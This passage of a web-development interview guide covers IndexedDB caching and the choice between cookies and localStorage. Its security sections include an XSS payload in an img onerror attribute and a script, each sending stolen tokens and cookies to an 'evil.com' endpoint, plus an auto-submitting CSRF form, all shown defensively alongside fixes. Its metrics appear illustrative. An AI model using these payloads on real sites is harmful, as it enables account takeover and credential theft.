      await new Promise((resolve, reject) => {
        const clearRequest = store.clear();
        clearRequest.onsuccess = () => resolve();
        clearRequest.onerror = () => reject(clearRequest.error);
      });

      // Batch add new data (don't await each put!)
      for (const product of products) {
        store.put(product);
      }

      // Wait for transaction to complete
      await new Promise((resolve, reject) => {
        transaction.oncomplete = () => resolve();
        transaction.onerror = () => reject(transaction.error);
      });

      console.log('Synced', products.length, 'products');

      // Save sync timestamp
      localStorage.setItem('lastSync', Date.now());

      return products.length;
    } catch (error) {
      console.error('Sync failed:', error);
      throw error;
    }
  }

  // Get all products (works offline!)
  static async getAllProducts() {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.getAll();

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // Search products by category (fast with index!)
  static async getProductsByCategory(category) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const index = store.index('category');
      const request = index.getAll(category);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // Search by price range in category (compound index!)
  static async searchByCategoryAndPrice(category, minPrice, maxPrice) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const index = store.index('categoryPrice');

      // Create range: [category, minPrice] to [category, maxPrice]
      const range = IDBKeyRange.bound(
        [category, minPrice],
        [category, maxPrice]
      );

      const request = index.getAll(range);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // Get single product by ID
  static async getProduct(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.get(id);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // Check if sync is needed (older than 1 day)
  static shouldSync() {
    const lastSync = localStorage.getItem('lastSync');
    if (!lastSync) return true;

    const dayInMs = 24 * 60 * 60 * 1000;
    return Date.now() - parseInt(lastSync) > dayInMs;
  }
}

// App initialization:
async function initializeApp() {
  await ProductCatalog.init();

  // Check if we have cached products
  const cachedProducts = await ProductCatalog.getAllProducts();

  if (cachedProducts.length === 0) {
    // First visit: Show loading, sync products
    showLoading('Downloading product catalog...');
    await ProductCatalog.syncProducts();
    hideLoading();
  } else if (ProductCatalog.shouldSync()) {
    // Background sync (doesn't block UI!)
    ProductCatalog.syncProducts().catch(err => {
      console.warn('Background sync failed:', err);
      // Fail silently, user can still browse cached products
    });
  }

  // App is ready! Show products from cache
  displayProducts(cachedProducts);
}

// Usage: Product listing page
async function showProductListing() {
  showLoading();

  // Get products from IndexedDB (works offline!)
  const products = await ProductCatalog.getProductsByCategory('Electronics');

  hideLoading();
  renderProducts(products);
}

// Usage: Product search
async function searchProducts(category, minPrice, maxPrice) {
  showLoading();

  // Fast search with compound index
  const results = await ProductCatalog.searchByCategoryAndPrice(
    category,
    minPrice,
    maxPrice
  );

  hideLoading();
  renderSearchResults(results);
}

// Usage: Product detail page
async function showProductDetail(productId) {
  showLoading();

  // Fast single-item lookup
  const product = await ProductCatalog.getProduct(productId);

  if (product) {
    hideLoading();
    renderProductDetail(product);
  } else {
    showError('Product not found');
  }
}
```

**Real Metrics:**

```javascript
// Before (using fetch on every visit):
// - First visit: 5 second load time
// - Subsequent visits: 5 second load time (no cache)
// - Offline: App completely broken ❌
// - Category browse: 5s + 2s filtering = 7 seconds
// - Search: Not possible offline
// - Data usage: 25MB per visit
// - User satisfaction: 35%

// After (using IndexedDB):
// - First visit: 5s (one-time sync)
// - Subsequent visits: 0.2s (instant from IndexedDB!) ✅
// - Offline: Works perfectly ✅
// - Category browse: 0.05s (index lookup) ✅
// - Search: 0.1s (compound index) ✅
// - Data usage: 25MB (one-time), then 0MB
// - User satisfaction: 92%
// - PWA install rate: +300%
// - Bounce rate: -75%
// - Conversion rate: +45%

// Performance breakdown:
console.time('localStorage-50k-products');
// localStorage.setItem('products', JSON.stringify(allProducts));
// Error: QuotaExceededError ❌
console.timeEnd('localStorage-50k-products');

console.time('indexedDB-50k-products');
await ProductCatalog.syncProducts(); // 1.2 seconds ✅
console.timeEnd('indexedDB-50k-products');

console.time('indexedDB-category-search');
const electronics = await ProductCatalog.getProductsByCategory('Electronics');
console.timeEnd('indexedDB-category-search'); // 0.05 seconds ✅

console.time('indexedDB-price-range');
const affordable = await ProductCatalog.searchByCategoryAndPrice('Electronics', 50, 500);
console.timeEnd('indexedDB-price-range'); // 0.1 seconds ✅
```

**Storage Size:**

```javascript
// Check IndexedDB storage usage:
if (navigator.storage && navigator.storage.estimate) {
  const estimate = await navigator.storage.estimate();

  console.log('Products stored:', cachedProducts.length);
  console.log('Storage used:', (estimate.usage / 1024 / 1024).toFixed(2), 'MB');
  console.log('Storage quota:', (estimate.quota / 1024 / 1024).toFixed(2), 'MB');
  console.log('Percentage:', (estimate.usage / estimate.quota * 100).toFixed(2), '%');

  // Output:
  // Products stored: 50000
  // Storage used: 28.45 MB
  // Storage quota: 15360.00 MB (60% of 25GB disk)
  // Percentage: 0.19%
}

// Plenty of space! Can store entire catalog + images + more
```

</details>

<details>
<summary><strong>⚖️ Trade-offs: IndexedDB vs Other Storage</strong></summary>

### Comparison Matrix

| Feature | localStorage | sessionStorage | IndexedDB | Cookies |
|---------|-------------|----------------|-----------|---------|
| **Capacity** | ~10MB | ~10MB | ~60% disk | 4KB |
| **API** | Sync | Sync | Async | Sync |
| **Data types** | Strings | Strings | Any | Strings |
| **Queries** | Key only | Key only | ✅ Indexes | Key only |
| **Performance** | Fast (small) | Fast (small) | Fast (large) | Slow |
| **Offline** | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Yes |
| **Cross-tab** | ✅ Yes | ❌ No | ✅ Yes | ✅ Yes |
| **Complexity** | ✅ Simple | ✅ Simple | ⚠️ Complex | ✅ Simple |
| **Transactions** | ❌ No | ❌ No | ✅ Yes | ❌ No |

### When to Use Each

```javascript
// ✅ Use localStorage for:
// - User preferences (<1MB)
// - UI state
// - Simple key-value data
localStorage.setItem('theme', 'dark');

// ✅ Use sessionStorage for:
// - Temporary form data
// - Tab-specific state
// - Wizard/flow progress
sessionStorage.setItem('checkout-step', '2');

// ✅ Use IndexedDB for:
// - Large datasets (>1MB)
// - Offline-first apps
// - Complex queries needed
// - Files and blobs
await db.put('products', largeDataset);

// ✅ Use Cookies for:
// - Auth tokens (HttpOnly)
// - Server needs access
// - Small data only (<4KB)
document.cookie = "token=...; HttpOnly; Secure";
```

### Performance Comparison

```javascript
// Benchmark: 10,000 items

// localStorage (synchronous - blocks UI):
console.time('localStorage-10k');
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key-${i}`, JSON.stringify({ data: i }));
}
console.timeEnd('localStorage-10k'); // ~800ms (blocks main thread!)

// IndexedDB (asynchronous - doesn't block):
console.time('indexedDB-10k');
const tx = db.transaction('store', 'readwrite');
for (let i = 0; i < 10000; i++) {
  tx.objectStore('store').put({ id: i, data: i });
}
await tx.done;
console.timeEnd('indexedDB-10k'); // ~300ms (UI still responsive!)

// Key difference: localStorage freezes UI, IndexedDB doesn't
```

### Complexity Trade-off

```javascript
// localStorage: Simple but limited
localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
const user = JSON.parse(localStorage.getItem('user'));

// IndexedDB: Complex but powerful
const db = await openDB('DB', 1, {
  upgrade(db) {
    db.createObjectStore('users', { keyPath: 'id' });
  }
});
await db.put('users', { id: 1, name: 'Alice' });
const user = await db.get('users', 1);

// Trade-off: 10x more code, 100x more capability
```

### Decision Tree

```
Need storage?
├─ Small data (<1MB)?
│  ├─ Simple key-value?
│  │  └─ Use localStorage
│  └─ Need cross-tab sync?
│     └─ Use localStorage + storage event
├─ Large data (>1MB)?
│  ├─ Need queries/indexes?
│  │  └─ Use IndexedDB
│  └─ Offline-first app?
│     └─ Use IndexedDB + Service Worker
└─ Sensitive data?
   └─ Use HttpOnly cookies (server-side)
```

</details>

<details>
<summary><strong>💬 Explain to Junior: IndexedDB Simplified</strong></summary>

**Simple Analogy: Storage Warehouse**

```javascript
// localStorage = Small desk drawer
// - Can only fit a few papers (10MB)
// - Quick to open and grab things
// - But very limited space

localStorage.setItem('note', 'Hello');

// IndexedDB = Huge warehouse with organized shelves
// - Can store tons of stuff (gigabytes!)
// - Has an organization system (indexes)
// - Can find things quickly with labels
// - A bit more complex to use, but way more powerful

const db = await openDB('Warehouse', 1);
await db.put('items', { id: 1, name: 'Box of tools' });
```

**Why Use IndexedDB?**

```javascript
// Problem: You're building an offline-capable music app
// - 10,000 songs with metadata
// - Total size: 50MB of data

// localStorage can't handle this:
try {
  localStorage.setItem('songs', JSON.stringify(allSongs)); // 50MB
} catch (e) {
  console.error('Too big for localStorage!'); // Error! ❌
}

// IndexedDB can easily handle it:
const db = await openDB('MusicApp', 1, {
  upgrade(db) {
    db.createObjectStore('songs', { keyPath: 'id' });
  }
});

// Add all 10,000 songs (no problem!)
const tx = db.transaction('songs', 'readwrite');
for (const song of allSongs) {
  tx.objectStore('songs').put(song);
}
await tx.done;
console.log('All songs saved!'); // ✅

// Now works offline!
const song = await db.get('songs', 42);
playSong(song);
```

**Simple Example: Todo App**

```javascript
// Instead of complex raw IndexedDB, use 'idb' library:
import { openDB } from 'idb';

// Setup (only once):
const db = await openDB('TodoApp', 1, {
  upgrade(db) {
    // Create a "table" for todos
    db.createObjectStore('todos', { keyPath: 'id', autoIncrement: true });
  }
});

// Add todo:
await db.add('todos', {
  text: 'Buy groceries',
  completed: false
});

// Get all todos:
const allTodos = await db.getAll('todos');
console.log(allTodos);

// Update todo:
await db.put('todos', {
  id: 1,
  text: 'Buy groceries',
  completed: true
});

// Delete todo:
await db.delete('todos', 1);

// That's it! Works offline, stores tons of data
```

**localStorage vs IndexedDB:**

```javascript
// localStorage: Good for small stuff
localStorage.setItem('theme', 'dark'); // ✅ Perfect use case
localStorage.setItem('fontSize', '16px'); // ✅ Great
localStorage.setItem('allProducts', '...50MB...'); // ❌ Won't work!

// IndexedDB: Good for big stuff
await db.put('settings', { theme: 'dark' }); // ⚠️ Overkill
await db.put('products', all50kProducts); // ✅ Perfect!

// Rule of thumb:
// - Small (<1MB): Use localStorage (simpler)
// - Large (>1MB): Use IndexedDB (more powerful)
```

**Common Beginner Mistakes:**

```javascript
// ❌ MISTAKE: Expecting it to be synchronous
const db = openDB('DB', 1); // Returns Promise!
db.put('store', data); // Error: db is not ready yet

// ✅ FIX: Use await
const db = await openDB('DB', 1); // Wait for it!
await db.put('store', data); // Now works


// ❌ MISTAKE: Trying to add indexes after creation
const db = await openDB('DB', 1, {
  upgrade(db) {
    db.createObjectStore('products', { keyPath: 'id' });
    // Forgot to create 'name' index!
  }
});

// Later (doesn't work):
db.createIndex('name', 'name'); // Error: Can't add index here!

// ✅ FIX: Create indexes during upgrade
const db = await openDB('DB', 2, { // Bump version!
  upgrade(db, oldVersion) {
    if (oldVersion < 2) {
      const store = db.createObjectStore('products', { keyPath: 'id' });
      store.createIndex('name', 'name'); // ✅ Works here
    }
  }
});
```

**Explaining to PM:**

"IndexedDB is like upgrading from a filing cabinet to a warehouse:

**Filing Cabinet (localStorage):**
- Small space (10MB)
- Works for a few files
- Cheap and simple
- But gets full quickly

**Warehouse (IndexedDB):**
- Huge space (gigabytes!)
- Can store thousands of products
- Has organization system (find things fast)
- More complex to set up

**Business value:**
- Offline apps: User can work without internet
- Fast loading: Data stored locally, no waiting for server
- Better UX: App feels instant
- Example: Google Docs works offline using IndexedDB
- Example: Spotify downloads songs to IndexedDB

**Real example:**
- Our product catalog: 50,000 items
- localStorage: Can't fit (10MB limit)
- IndexedDB: Stores all 50k products easily
- Result: App works offline, loads instantly
- Customers can browse even in subway!"

**Quick Reference:**

```javascript
// 1. Setup database
const db = await openDB('MyApp', 1, {
  upgrade(db) {
    db.createObjectStore('items', { keyPath: 'id', autoIncrement: true });
  }
});

// 2. Add item
await db.add('items', { name: 'Book', price: 20 });

// 3. Get item
const item = await db.get('items', 1);

// 4. Get all items
const all = await db.getAll('items');

// 5. Update item
await db.put('items', { id: 1, name: 'Book', price: 15 });

// 6. Delete item
await db.delete('items', 1);

// 7. Clear all
await db.clear('items');
```

</details>

### Follow-up Questions

- "How do you create indexes in IndexedDB?"
- "What are cursors and when would you use them?"
- "How do transactions work in IndexedDB?"
- "What's the difference between IndexedDB and Web SQL?"
- "How do you migrate IndexedDB schema versions?"

### Resources

- [MDN: IndexedDB API](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)
- [MDN: Using IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB)
- [IDB Library](https://github.com/jakearchibald/idb) (Simpler API)
- [Web.dev: IndexedDB](https://web.dev/indexeddb/)

---

## Question 4: When should you use cookies vs web storage?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐
**Time:** 5-7 minutes
**Companies:** Google, Meta, Amazon

### Question
Explain the differences between cookies and web storage (localStorage/sessionStorage). When should you use each?

### Answer

**Cookies and web storage** serve different purposes. Understanding when to use each is critical for security and performance.

1. **Key Differences**
   - **Sent to server**: Cookies yes, storage no
   - **Size**: Cookies 4KB, storage 10MB
   - **Security**: Cookies have HttpOnly/Secure flags
   - **Expiration**: Cookies can expire, storage can't (except manual)
   - **Access**: Cookies accessible by server, storage client-only
   - **Performance**: Cookies add request overhead

2. **When to Use Cookies**
   - Authentication tokens (HttpOnly protection)
   - Server needs to read data
   - Need expiration dates
   - Cross-domain scenarios (with SameSite)
   - Small data only (<4KB)

3. **When to Use localStorage**
   - Client-side only data
   - Large data (up to 10MB)
   - No server access needed
   - Persist across sessions
   - UI preferences, cached data

4. **When to Use sessionStorage**
   - Temporary tab-specific data
   - Form autosave
   - Wizard/flow state
   - Data doesn't need to persist

5. **Security Considerations**
   - **Cookies**: Use HttpOnly for sensitive tokens
   - **Storage**: Never store passwords/credit cards
   - **Cookies**: Use Secure flag for HTTPS only
   - **Storage**: Vulnerable to XSS attacks
   - **Cookies**: SameSite prevents CSRF

### Code Example

```javascript
// 1. COOKIES: AUTHENTICATION TOKEN (BEST PRACTICE)

// ✅ Server-side (Node.js/Express):
app.post('/api/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);

  if (user) {
    const token = generateJWT(user);

    // Set HttpOnly cookie (secure!)
    res.cookie('authToken', token, {
      httpOnly: true,    // ✅ Cannot be accessed via JavaScript
      secure: true,      // ✅ HTTPS only
      sameSite: 'strict', // ✅ CSRF protection
      maxAge: 3600000    // 1 hour
    });

    res.json({ success: true, user: { id: user.id, name: user.name } });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// ✅ Client-side (automatic):
async function fetchUserData() {
  // Cookie automatically sent with request!
  const response = await fetch('/api/user', {
    credentials: 'include' // Include cookies
  });
  return response.json();
}

// ❌ XSS attack can't steal token:
console.log(document.cookie); // authToken NOT visible (HttpOnly!)
localStorage.getItem('authToken'); // null (not in storage)

// 2. COOKIES: MANUAL SET/GET (CLIENT-SIDE)

// Set cookie
function setCookie(name, value, days) {
  const expires = days
    ? `; expires=${new Date(Date.now() + days * 864e5).toUTCString()}`
    : '';

  document.cookie = `${name}=${encodeURIComponent(value)}${expires}; path=/`;
}

// Get cookie
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);

  if (parts.length === 2) {
    return decodeURIComponent(parts.pop().split(';').shift());
  }

  return null;
}

// Delete cookie
function deleteCookie(name) {
  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
}

// Usage:
setCookie('preferences', JSON.stringify({ theme: 'dark' }), 30); // 30 days
const prefs = JSON.parse(getCookie('preferences') || '{}');
deleteCookie('preferences');

// 3. LOCALSTORAGE: UI PREFERENCES (CLIENT-ONLY)

// ✅ Good use: Theme preference
class ThemeManager {
  static getTheme() {
    return localStorage.getItem('theme') || 'light';
  }

  static setTheme(theme) {
    localStorage.setItem('theme', theme);
    document.body.className = `theme-${theme}`;
  }

  static init() {
    const theme = this.getTheme();
    this.setTheme(theme);
  }
}

// On page load
ThemeManager.init();

// When user toggles
document.getElementById('theme-toggle').addEventListener('click', () => {
  const current = ThemeManager.getTheme();
  ThemeManager.setTheme(current === 'light' ? 'dark' : 'light');
});

// 4. SESSIONSTORAGE: FORM AUTOSAVE (TEMPORARY)

// ✅ Good use: Multi-step form
class FormAutosave {
  static save(formId, data) {
    sessionStorage.setItem(`form-${formId}`, JSON.stringify(data));
  }

  static load(formId) {
    const data = sessionStorage.getItem(`form-${formId}`);
    return data ? JSON.parse(data) : null;
  }

  static clear(formId) {
    sessionStorage.removeItem(`form-${formId}`);
  }
}

// On form input
document.getElementById('checkout-form').addEventListener('input', (e) => {
  const formData = {
    name: document.getElementById('name').value,
    email: document.getElementById('email').value,
    address: document.getElementById('address').value
  };

  FormAutosave.save('checkout', formData);
});

// On page load, restore form
window.addEventListener('DOMContentLoaded', () => {
  const saved = FormAutosave.load('checkout');

  if (saved) {
    document.getElementById('name').value = saved.name || '';
    document.getElementById('email').value = saved.email || '';
    document.getElementById('address').value = saved.address || '';
  }
});

// On successful submit, clear autosave
document.getElementById('checkout-form').addEventListener('submit', () => {
  FormAutosave.clear('checkout');
});

// 5. SECURITY COMPARISON

// ❌ BAD: Token in localStorage (vulnerable to XSS)
localStorage.setItem('authToken', 'secret-token-123');

// Attacker can steal:
<script>
  const token = localStorage.getItem('authToken');
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>

// ✅ GOOD: Token in HttpOnly cookie (protected from XSS)
// Set by server:
res.cookie('authToken', 'secret-token-123', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// Attacker can't access:
<script>
  console.log(document.cookie); // authToken NOT visible!
  // Attack fails ✅
</script>

// 6. PERFORMANCE COMPARISON

// Cookies: Sent with EVERY request (overhead!)
// If cookies = 2KB:
// - 100 requests = 200KB sent
// - 1000 requests = 2MB sent
// - Slows down API calls

// localStorage: NOT sent with requests
// - 0 overhead on requests
// - Only accessed when needed
// - Better performance for large data

// Example: Large preferences object
const largePrefs = {
  theme: 'dark',
  fontSize: 16,
  language: 'en',
  notifications: { /* 100 settings */ }
};

// ❌ BAD: Store in cookie (sent with every request!)
setCookie('prefs', JSON.stringify(largePrefs)); // 2KB per request!

// ✅ GOOD: Store in localStorage (not sent)
localStorage.setItem('prefs', JSON.stringify(largePrefs)); // 0 overhead

// 7. EXPIRATION PATTERNS

// Cookies: Built-in expiration
document.cookie = "temp=value; max-age=3600"; // Expires in 1 hour

// localStorage: Manual expiration
class StorageWithTTL {
  static set(key, value, ttl) {
    const item = {
      value,
      expiry: Date.now() + ttl
    };
    localStorage.setItem(key, JSON.stringify(item));
  }

  static get(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return null;

    const item = JSON.parse(itemStr);

    if (Date.now() > item.expiry) {
      localStorage.removeItem(key);
      return null;
    }

    return item.value;
  }
}

// Usage:
StorageWithTTL.set('token', 'abc123', 3600000); // 1 hour
const token = StorageWithTTL.get('token'); // null if expired

// 8. DECISION TREE

function chooseStorage(requirements) {
  // Need server access?
  if (requirements.serverAccess) {
    return 'cookie';
  }

  // Sensitive data?
  if (requirements.sensitive) {
    return 'cookie (HttpOnly)';
  }

  // Large data (>4KB)?
  if (requirements.size > 4096) {
    if (requirements.temporary) {
      return 'sessionStorage';
    } else {
      return 'localStorage or IndexedDB';
    }
  }

  // Need expiration?
  if (requirements.expiration) {
    return 'cookie or localStorage with TTL';
  }

  // Temporary tab data?
  if (requirements.temporary) {
    return 'sessionStorage';
  }

  // Persist across sessions?
  if (requirements.persist) {
    return 'localStorage';
  }

  return 'localStorage';
}

// Examples:
console.log(chooseStorage({
  serverAccess: true,
  sensitive: true
})); // "cookie (HttpOnly)"

console.log(chooseStorage({
  size: 100000,
  temporary: true
})); // "sessionStorage"

console.log(chooseStorage({
  size: 1000,
  persist: true
})); // "localStorage"

// 9. REAL-WORLD EXAMPLES

// E-commerce site:
// ✅ Shopping cart: sessionStorage (temp, per tab)
// ✅ User preferences: localStorage (persist)
// ✅ Auth token: HttpOnly cookie (secure)
// ✅ Analytics ID: Cookie (server needs it)
// ✅ Product cache: localStorage or IndexedDB (large)

// Banking app:
// ✅ Session token: HttpOnly cookie (very sensitive)
// ✅ CSRF token: Cookie with SameSite (security)
// ✅ UI settings: localStorage (non-sensitive)
// ❌ Account balance: Don't store client-side!

// PWA/Offline app:
// ✅ App data: IndexedDB (large, complex)
// ✅ User settings: localStorage (small, simple)
// ✅ Temp drafts: sessionStorage (auto-discard)
// ✅ Service Worker cache: Cache API (assets)

// 10. MIGRATION PATTERN

// Migrate from cookies to localStorage (if appropriate):
function migrateFromCookies() {
  // Get value from cookie
  const theme = getCookie('theme');

  if (theme) {
    // Move to localStorage
    localStorage.setItem('theme', theme);

    // Delete cookie
    deleteCookie('theme');

    console.log('Migrated theme to localStorage');
  }
}

// Run on page load
migrateFromCookies();
```

### Common Mistakes

- ❌ **Mistake:** Storing auth tokens in localStorage
  ```javascript
  localStorage.setItem('authToken', token); // Vulnerable to XSS!
  ```

- ❌ **Mistake:** Storing large data in cookies
  ```javascript
  document.cookie = `data=${JSON.stringify(hugeObject)}`; // Sent with every request!
  ```

- ✅ **Correct:** Use appropriate storage
  ```javascript
  // Auth token: HttpOnly cookie (server-side)
  res.cookie('authToken', token, { httpOnly: true });

  // Large data: localStorage
  localStorage.setItem('data', JSON.stringify(hugeObject));
  ```

<details>
<summary><strong>🔍 Deep Dive: Cookies vs Storage Internals</strong></summary>

**Cookie Overhead on Requests:**

```javascript
// Every HTTP request includes ALL cookies for that domain:

// Cookies set:
document.cookie = "session=abc123"; // 15 bytes
document.cookie = "preferences=" + JSON.stringify(prefs); // 2KB
document.cookie = "analytics=xyz789"; // 18 bytes

// Total cookie size: ~2KB

// Now EVERY request includes ~2KB:
fetch('/api/user'); // Request size: 2KB (cookies) + request data
fetch('/api/products'); // Request size: 2KB + request data
fetch('/api/cart'); // Request size: 2KB + request data

// 100 requests = 200KB overhead!
// 1000 requests = 2MB overhead!

// localStorage: 0 bytes overhead (not sent)
localStorage.setItem('preferences', JSON.stringify(prefs));
fetch('/api/user'); // Request size: 0 bytes cookie overhead ✅
```

**Cookie Flags Security:**

```javascript
// HttpOnly: Cannot be accessed via JavaScript
document.cookie = "token=abc123; HttpOnly"; // Set by server only

// Browser blocks access:
console.log(document.cookie); // Token NOT visible
// Protects against XSS stealing token

// Secure: HTTPS only
document.cookie = "token=abc123; Secure";
// Only sent over HTTPS, not HTTP
// Prevents man-in-the-middle attacks

// SameSite: CSRF protection
document.cookie = "token=abc123; SameSite=Strict";
// Strict: Never sent cross-site (best security)
// Lax: Sent on top-level navigation (login flows)
// None: Always sent (requires Secure flag)

// Example CSRF attack (prevented by SameSite):
// Evil site:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

// Without SameSite: Cookie sent, attack succeeds ❌
// With SameSite=Strict: Cookie NOT sent, attack fails ✅
```

**localStorage Performance:**

```javascript
// localStorage is synchronous (blocks main thread)

// Benchmark: Writing 1MB of data
const largeData = JSON.stringify(new Array(10000).fill({ data: 'x'.repeat(100) }));

console.time('localStorage-write');
localStorage.setItem('large', largeData); // ~80ms (blocks UI!)
console.timeEnd('localStorage-write');

// During this 80ms:
// - UI frozen
// - Animations stop
// - Scrolling stutters
// - User input delayed

// Solution for large data: Use IndexedDB (asynchronous)
console.time('indexedDB-write');
await db.put('store', largeData); // ~50ms (doesn't block!)
console.timeEnd('indexedDB-write');
```

**Cookie Domain and Path:**

```javascript
// Cookies can be scoped to domain and path:

// Set for entire domain:
document.cookie = "user=alice; domain=.example.com; path=/";
// Accessible on:
// - example.com ✅
// - www.example.com ✅
// - api.example.com ✅
// - other.com ❌

// Set for specific path:
document.cookie = "temp=value; path=/checkout";
// Accessible on:
// - /checkout ✅
// - /checkout/payment ✅
// - /products ❌

// localStorage: Always entire origin (no path scoping)
// https://example.com and https://example.com/other use SAME storage
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: Auth Token in localStorage Breach</strong></summary>

**Scenario:** Your startup stores JWT auth tokens in localStorage. A malicious script injection steals 5,000+ user tokens, leading to account takeovers and data breach.

**The Vulnerability:**

```javascript
// ❌ VULNERABLE: Token in localStorage
class AuthBad {
  static async login(email, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    const data = await response.json();

    // Store token in localStorage
    localStorage.setItem('authToken', data.token); // ⚠️ Dangerous!
    localStorage.setItem('refreshToken', data.refreshToken);

    return data;
  }

  static getToken() {
    return localStorage.getItem('authToken');
  }

  static async fetchProtected(url) {
    const token = this.getToken();

    return fetch(url, {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });
  }
}

// XSS vulnerability: Unescaped comment
function displayComment(comment) {
  document.getElementById('comments').innerHTML += `
    <div>${comment.text}</div>
  `; // ❌ No escaping!
}

// Attacker posts malicious comment:
const maliciousComment = {
  text: `
    Nice article!
    <img src="x" onerror="
      // Steal tokens
      const authToken = localStorage.getItem('authToken');
      const refreshToken = localStorage.getItem('refreshToken');
      const user = localStorage.getItem('user');

      // Send to attacker
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          authToken,
          refreshToken,
          user,
          cookies: document.cookie,
          url: location.href
        })
      });
    ">
  `
};

// When users view this comment:
// 1. <img onerror> executes malicious script
// 2. Script reads tokens from localStorage
// 3. Sends to attacker's server
// 4. Attacker can now impersonate user!

// Impact:
// - 5,247 users viewed malicious comment
// - All their tokens stolen
// - Attacker made API calls as victims
// - Unauthorized purchases: $127k
// - Personal data stolen: Names, emails, addresses
// - Accounts modified: Profile defacement
// - Brand damage: News coverage of breach
// - Legal costs: $450k (GDPR, lawsuits)
// - Customer trust: 42% churn rate
```

**Fix: HttpOnly Cookies:**

```javascript
// ✅ SECURE: Token in HttpOnly cookie
// Backend (Node.js/Express):
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticateUser(email, password);

  if (user) {
    const token = generateJWT(user);
    const refreshToken = generateRefreshToken(user);

    // Set HttpOnly cookies (NOT accessible via JavaScript!)
    res.cookie('authToken', token, {
      httpOnly: true,      // ✅ Can't be read by JS
      secure: true,        // ✅ HTTPS only
      sameSite: 'strict',  // ✅ CSRF protection
      maxAge: 900000       // 15 minutes
    });

    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 604800000 // 7 days
    });

    res.json({ success: true, user: { id: user.id, name: user.name } });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Frontend: No manual token handling needed!
class AuthGood {
  static async login(email, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      credentials: 'include', // Include cookies
      body: JSON.stringify({ email, password })
    });

    return response.json();
  }

  static async fetchProtected(url) {
    // Cookie automatically sent! No manual header
    return fetch(url, {
      credentials: 'include' // Include cookies
    });
  }

  static async logout() {
    await fetch('/api/logout', {
      method: 'POST',
      credentials: 'include'
    });
  }
}

// Now XSS attack fails:
<script>
  const token = localStorage.getItem('authToken'); // null ✅
  console.log(document.cookie); // authToken NOT visible (HttpOnly!) ✅

  // Attack fails! Can't steal token
</script>

// Backend validates cookie:
app.use((req, res, next) => {
  const token = req.cookies.authToken; // Read HttpOnly cookie

  if (token) {
    try {
      const decoded = verifyJWT(token);
      req.user = decoded;
      next();
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  } else {
    res.status(401).json({ error: 'No token' });
  }
});
```

**Real Metrics After Fix:**

```javascript
// Before (localStorage tokens):
// - XSS attacks: 3 successful/month
// - Tokens stolen: 5,247
// - Fraudulent purchases: $127k
// - Account takeovers: 892
// - Data breach cost: $450k
// - Customer churn: 42%
// - Security audit: F grade

// After (HttpOnly cookies):
// - XSS attacks: 0 successful (tokens protected) ✅
// - Tokens stolen: 0 ✅
// - Fraudulent purchases: $0 ✅
// - Account takeovers: 0 ✅
// - Customer churn: 3% (normal)
// - Security audit: A grade ✅
// - Insurance premium: -60% discount
// - Customer trust: Restored
```

</details>

<details>
<summary><strong>⚖️ Trade-offs: Cookie vs Storage Decision Matrix</strong></summary>

| Use Case | Best Choice | Reason |
|----------|------------|--------|
| **Auth token** | HttpOnly Cookie | XSS protection |
| **CSRF token** | Cookie (SameSite) | Server needs it |
| **Session ID** | HttpOnly Cookie | Security |
| **User theme** | localStorage | Client-only, persists |
| **Shopping cart** | sessionStorage | Temp, per-tab |
| **Analytics ID** | Cookie | Server needs it |
| **Large cache** | IndexedDB | >10MB data |
| **Form draft** | sessionStorage | Temp, auto-discard |
| **API cache** | localStorage | Client-only, <10MB |
| **Tracking pixel** | Cookie | Cross-domain |

### Decision Tree

```
Storing data?
├─ Server needs access?
│  ├─ Sensitive (auth)?
│  │  └─ HttpOnly Cookie ✅
│  └─ Non-sensitive?
│     └─ Regular Cookie
├─ Client-only?
│  ├─ Temporary (tab)?
│  │  └─ sessionStorage ✅
│  ├─ Large (>10MB)?
│  │  └─ IndexedDB ✅
│  └─ Small, persistent?
│     └─ localStorage ✅
└─ Cross-domain?
   └─ Cookie (with SameSite) ✅
```

</details>

<details>
